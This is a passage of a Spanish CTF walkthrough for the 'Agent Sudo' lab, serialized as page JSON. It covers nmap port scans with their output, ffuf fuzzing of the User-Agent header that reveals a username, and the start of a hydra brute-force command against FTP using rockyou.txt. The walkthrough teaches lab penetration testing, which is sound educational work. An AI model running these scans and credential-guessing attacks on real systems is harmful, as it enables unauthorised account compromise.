"},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-T4:"}]},{"type":"text","value":" Usar plantilla de temporizado 4 (\"aggresive\"). Esto no es necesario y podemos optar por usar la plantilla por defecto \"normal\" (-T3)."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-oN [archivo]:"}]},{"type":"text","value":" Escribir resultados en formato \"normal\" en el archivo indicado."}]}]}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"sudo nmap -p- -n -Pn -T4 10.10.195.209 -oN nmap.txt\n\n# Nmap 7.95 scan initiated Fri May 30 16:11:54 2025 as: /usr/lib/nmap/nmap -p- -n -Pn -T4 -oN nmap.txt 10.10.195.209\nNmap scan report for 10.10.195.209\nHost is up (0.27s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT   STATE SERVICE\n21/tcp open  ftp\n22/tcp open  ssh\n80/tcp open  http\n","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"sudo nmap -p- -n -Pn -T4 10.10.195.209 -oN nmap.txt\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"# Nmap 7.95 scan initiated Fri May 30 16:11:54 2025 as: /usr/lib/nmap/nmap -p- -n -Pn -T4 -oN nmap.txt 10.10.195.209\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Nmap scan report for 10.10.195.209\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Host is up (0.27s latency).\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Not shown: 65532 closed tcp ports (reset)\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":7},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"PORT   STATE SERVICE\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":8},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"21/tcp open  ftp\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":9},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"22/tcp open  ssh\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":10},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"80/tcp open  http\n"}]}]}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Descubrimos el puerto "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"21"}]},{"type":"text","value":" para "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"FTP"}]},{"type":"text","value":", puerto "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"22"}]},{"type":"text","value":" para "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"SSH"}]},{"type":"text","value":" y puerto "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"80"}]},{"type":"text","value":" para "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"HTTP"}]},{"type":"text","value":". Obtenemos información de los puertos abiertos."}]},{"type":"element","tag":"pre","props":{"className":"language-bash shiki shiki-themes github-dark","code":"sudo nmap -sCV -n -Pn -T4 10.10.195.209 -oN nmap-ports.txt\n","language":"bash","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"sudo"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" nmap"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -sCV"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -n"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -Pn"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -T4"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" 10.10.195.209"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -oN"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" nmap-ports.txt\n"}]}]}]}]},{"type":"element","tag":"details","props":{},"children":[{"type":"element","tag":"summary","props":{},"children":[{"type":"text","value":"Explicación del comando"}]},{"type":"element","tag":"ul","props":{},"children":[{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"nmap:"}]},{"type":"text","value":" Herramienta para escanear puertos."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-sCV:"}]},{"type":"text","value":" Usar "},{"type":"element","tag":"i","props":{},"children":[{"type":"text","value":"scripts"}]},{"type":"text","value":" por defecto (-sC) y realizar escaneo de versiones (-sV)."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-n:"}]},{"type":"text","value":" No realizar resolución DNS."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-Pn:"}]},{"type":"text","value":" Asumir que el "},{"type":"element","tag":"i","props":{},"children":[{"type":"text","value":"host"}]},{"type":"text","value":" esta en linea para evitar que Nmap intente primero descubrirlo."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-T4:"}]},{"type":"text","value":" Usar plantilla de temporizado 4 (\"aggresive\"). Esto no es necesario y podemos optar por usar la plantilla por defecto \"normal\" (-T3)."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-oN [archivo]:"}]},{"type":"text","value":" Escribir resultados en formato \"normal\" en el archivo indicado."}]}]}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"sudo nmap -sCV -n -Pn -T4 10.10.195.209 -oN nmap-ports.txt\n\n# Nmap 7.95 scan initiated Fri May 30 16:25:00 2025 as: /usr/lib/nmap/nmap -sCV -p 21,22,80 -n -Pn -T4 -oN nmap-ports.txt 10.10.195.209\nNmap scan report for 10.10.195.209\nHost is up (0.27s latency).\n\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)\n|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)\n|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-title: Annoucement\n|_http-server-header: Apache/2.4.29 (Ubuntu)\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"sudo nmap -sCV -n -Pn -T4 10.10.195.209 -oN nmap-ports.txt\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"# Nmap 7.95 scan initiated Fri May 30 16:25:00 2025 as: /usr/lib/nmap/nmap -sCV -p 21,22,80 -n -Pn -T4 -oN nmap-ports.txt 10.10.195.209\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Nmap scan report for 10.10.195.209\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Host is up (0.27s latency).\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":7},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"PORT   STATE SERVICE VERSION\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":8},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"21/tcp open  ftp     vsftpd 3.0.3\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":9},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":10},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"| ssh-hostkey:\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":11},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":12},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":13},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":14},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":15},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"|_http-title: Annoucement\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":16},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"|_http-server-header: Apache/2.4.29 (Ubuntu)\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":17},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n"}]}]}]}]},{"type":"element","tag":"blockquote","props":{},"children":[{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Para agilizar el proceso de escaneo y enumeración, primero encontramos puertos abiertos y luego los escaneamos en busca de banners, versiones y otra información util."}]}]},{"type":"element","tag":"h2","props":{"id":"enumeración-de-servicios"},"children":[{"type":"text","value":"Enumeración de servicios"}]},{"type":"element","tag":"h3","props":{"id":"tcp21"},"children":[{"type":"text","value":"TCP/21"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"No es posible realizar un inicio de sesión anónimo en el servicio "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"FTP"}]},{"type":"text","value":". Por lo que tendremos que revisitar este puerto mas adelante."}]},{"type":"element","tag":"h3","props":{"id":"tcp80"},"children":[{"type":"text","value":"TCP/80"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Al ingresar a la pagina web, se nos da la bienvenida con un mensaje críptico."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"element","tag":"img","props":{"alt":"image-1","src":"/writeups/tryhackme-agent-sudo/image-1.png"},"children":[]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"\"user-agent\" se refiere a la cabecera HTTP "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"User-Agent"}]},{"type":"text","value":", por lo que debemos de cambiarla para poder acceder. ¿Pero que \"código nombre\" debemos utilizar? Puesto que el mensaje fue firmado por "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"Agent R"}]},{"type":"text","value":", podemos intuir que nuestro código nombre corresponde a alguna de las letras del abecedario."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Creamos una lista de palabras con todas las letras del abecedario en mayúscula haciendo uso de "},{"type":"element","tag":"strong","props":{},"children":[{"type":"text","value":"TTPassGen"}]},{"type":"text","value":"."}]},{"type":"element","tag":"pre","props":{"className":"language-bash shiki shiki-themes github-dark","code":"ttpassgen -r \"[?u]{1:1}\" wordlist.txt\n","language":"bash","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"ttpassgen"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -r"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" \"[?u]{1:1}\""}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" wordlist.txt\n"}]}]}]}]},{"type":"element","tag":"details","props":{},"children":[{"type":"element","tag":"summary","props":{},"children":[{"type":"text","value":"Explicación del comando"}]},{"type":"element","tag":"ul","props":{},"children":[{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"ttpassgen:"}]},{"type":"text","value":" Generador de listas de palabras altamente flexible escrito en Python."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-r [regla]:"}]},{"type":"text","value":"Regla a usar (consultar el repositorio de GitHub para mayor información)."}]}]}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"A\nB\nC\n[...]\nY\nZ\n","filename":"wordlist.txt","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"A\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"B\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"C\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"[...]\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Y\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Z\n"}]}]}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Enviamos solicitudes con "},{"type":"element","tag":"strong","props":{},"children":[{"type":"text","value":"ffuf"}]},{"type":"text","value":". Puesto que la lista de palabras es corta, y no sabemos exactamente que esperar de una respuesta adecuada, podemos optar por no filtrar las respuestas y examinarlas manualmente. Sin embargo, también podemos suponer que una respuesta adecuada contendrá un código de respuesta diferente a "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"200 OK"}]},{"type":"text","value":" o tendrá un tamaño diferente al usual de 218 bytes."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Para propósitos educativos, elegiremos seguir las redirecciones y filtrar las respuestas basadas en su tamaño."}]},{"type":"element","tag":"pre","props":{"className":"language-bash shiki shiki-themes github-dark","code":"ffuf -u http://10.10.195.209 -H \"User-Agent: FUZZ\" -w wordlist.txt -c -r -fs 218\n","language":"bash","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"ffuf"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -u"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" http://10.10.195.209"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -H"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" \"User-Agent: FUZZ\""}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -w"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" wordlist.txt"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -c"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -r"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -fs"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" 218\n"}]}]}]}]},{"type":"element","tag":"details","props":{},"children":[{"type":"element","tag":"summary","props":{},"children":[{"type":"text","value":"Explicación del comando"}]},{"type":"element","tag":"ul","props":{},"children":[{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"ffuf:"}]},{"type":"text","value":" "},{"type":"element","tag":"i","props":{},"children":[{"type":"text","value":"Fuzzer"}]},{"type":"text","value":" web escrito en Go."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-u [url]:"}]},{"type":"text","value":" URL objetivo."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-H [cabecera]:"}]},{"type":"text","value":" Cabecera \"Nombre: Valor\"."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-w [lista de palabras]:"}]},{"type":"text","value":" Ruta del archivo con la lista de palabras."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-c:"}]},{"type":"text","value":" Colorear la salida (permite distinguir mejor las respuestas por sus códigos)."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-r:"}]},{"type":"text","value":" Seguir redirecciones."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-fs [tamaño]:"}]},{"type":"text","value":" Filtrar respuestas HTTP por tamaño."}]}]}]},{"type":"element","tag":"blockquote","props":{},"children":[{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"¿Filtrar por código de respuesta o por tamaño? Filtrar por código de respuesta nos puede llevar a omitir respuestas no estándares, por lo que seguiremos la redirecciones y filtraremos por tamaño de respuesta."}]}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"ffuf -u http://10.10.195.209 -H \"User-Agent: FUZZ\" -w wordlist.txt -c -r -fs 218\n\n[...]\nR                       [Status: 200, Size: 310, Words: 31, Lines: 19, Duration: 267ms]\nC                       [Status: 200, Size: 177, Words: 27, Lines: 8, Duration: 267ms]\n","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"ffuf -u http://10.10.195.209 -H \"User-Agent: FUZZ\" -w wordlist.txt -c -r -fs 218\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"[...]\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"R                       [Status: 200, Size: 310, Words: 31, Lines: 19, Duration: 267ms]\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"C                       [Status: 200, Size: 177, Words: 27, Lines: 8, Duration: 267ms]\n"}]}]}]}]},{"type":"element","tag":"blockquote","props":{},"children":[{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"La letra C originalmente nos redirige a otra pagina, mientras que la letra R nos muestra otro mensaje. Si hubiéramos filtrado todas las respuestas con código 200, hubiéramos omitido esta ultima respuesta."}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"El User-Agent R y C retornan respuestas diferentes a la estándar. Al enviar una petición con la cabecera "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"User-Agent: R"}]},{"type":"text","value":", obtenemos una respuesta ligeramente diferente a la original (pero sin importancia). La cabecera "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"User-Agent: C"}]},{"type":"text","value":" nos revela una respuesta completamente diferente."}]},{"type":"element","tag":"pre","props":{"className":"language-bash shiki shiki-themes github-dark","code":"curl -sL -H \"User-Agent: C\" http://10.10.195.209/\n","language":"bash","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"curl"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -sL"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -H"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" \"User-Agent: C\""}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" http://10.10.195.209/\n"}]}]}]}]},{"type":"element","tag":"details","props":{},"children":[{"type":"element","tag":"summary","props":{},"children":[{"type":"text","value":"Explicación del comando"}]},{"type":"element","tag":"ul","props":{},"children":[{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"curl:"}]},{"type":"text","value":" Herramienta para transferir datos desde o hacia un servidor usando URLs."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-sL:"}]},{"type":"text","value":" No mostrar barra de progreso (-s) y seguir redirecciones (-L)."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-H [cabecera]:"}]},{"type":"text","value":" Cabecera \"Nombre: Valor\"."}]}]}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"curl -sL -H \"User-Agent: C\" http://10.10.195.209/\n\nAttention chris, <br><br>\n\nDo you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>\n\nFrom,<br>\nAgent R\n","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"curl -sL -H \"User-Agent: C\" http://10.10.195.209/\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Attention chris, <br><br>\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":7},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"From,<br>\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":8},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Agent R\n"}]}]}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Descubrimos el nombre de usuario "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"chris"}]},{"type":"text","value":" y que su contraseña es débil."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Si intentamos enumerar directorios y paginas web, tales como formularios de inicio de sesión, no obtendremos resultados."}]},{"type":"element","tag":"h2","props":{"id":"explotación"},"children":[{"type":"text","value":"Explotación"}]},{"type":"element","tag":"h3","props":{"id":"ssh"},"children":[{"type":"text","value":"¿SSH?"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Al no encontrar un vector de explotación evidente, usaremos "},{"type":"element","tag":"strong","props":{},"children":[{"type":"text","value":"hydra"}]},{"type":"text","value":" para obtener la contraseña del servicio "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"SSH"}]},{"type":"text","value":" mediante fuerza bruta."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Iniciar sesión en este servicio corresponde al camino hacia el éxito mas directo, por tanto tiene sentido probar un ataque de fuerza bruta primero con este servicio. Pero en un entorno real este servicio estará fuertemente protegido y monitorizado, por lo que deberíamos de probar en otros lugares primero."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Finalmente, este ataque falla en obtener una contraseña valida en un intervalo de tiempo aceptable."}]},{"type":"element","tag":"blockquote","props":{},"children":[{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Nunca debes realizar un ataque de fuerza bruta, a menos que sea el único camino disponible o hayan grandes indicios de que este es el camino correcto."}]}]},{"type":"element","tag":"h3","props":{"id":"ftp"},"children":[{"type":"text","value":"FTP"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Al fallar el anterior ataque, esta vez lo intentaremos en el servicio "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"FTP"}]},{"type":"text","value":", haciendo uso de la famosa lista de palabras "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"rockyou.txt"}]},{"type":"text","value":"."}]},{"type":"element","tag":"blockquote","props":{},"children":[{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Si hay indicios de que una contraseña es débil, vale la pena usar listas de palabras conocidas como rockyou.txt (solo en CTFs)."}]}]},{"type":"element","tag":"pre","props":{"className":"language-bash shiki shiki-themes github-dark","code":"hydra -l \"chris\" -P /usr/share/wordlists/rockyou.txt -f -vV 10.10.195.209 ftp\n","language":"bash","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"hydra"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -l"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" \"chris\""}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -P"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" /usr/share/wordlists/rockyou.txt"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -f"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -vV"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" 